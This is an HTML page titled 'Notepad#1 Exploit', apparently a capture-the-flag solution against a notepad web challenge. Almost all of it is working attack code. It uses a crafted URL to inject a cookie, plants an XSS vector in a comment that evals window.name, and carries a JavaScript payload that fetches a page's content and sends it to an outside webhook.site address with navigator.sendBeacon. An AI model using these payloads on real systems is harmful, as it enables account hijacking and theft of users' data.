<!DOCTYPE html>
<!-- Attacker's note:  <img src/onerror="eval(window.name)"> -->
<html>
    <head>
        <title>
            Notepad#1 Exploit
        </title>
    </head>
    <body>
        <script>
            function sleep (time) {
                return new Promise((resolve) => setTimeout(resolve, time));
            }

            url = "http://chall.notepad.gq:3000/"
            webhook = "https://webhook.site/5137d429-6c68-41e2-996d-d8e7ee5b6997"
            userCookie = "55a54008ad1ba589aa210d2629c1df41"
            endpoint1 = url + `find?startsWith=d&debug=y&Set-Cookie=id=${userCookie}%3B%20path=/get`

            endpoint2 = url 
 
            endpoint2payload = `document.cookie="id=${userCookie}; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon("${webhook}",data));`

            window.open(endpoint1)
            
            sleep(1000).then(() => {
                window.open(endpoint2, name=endpoint2payload)
            });

        </script>
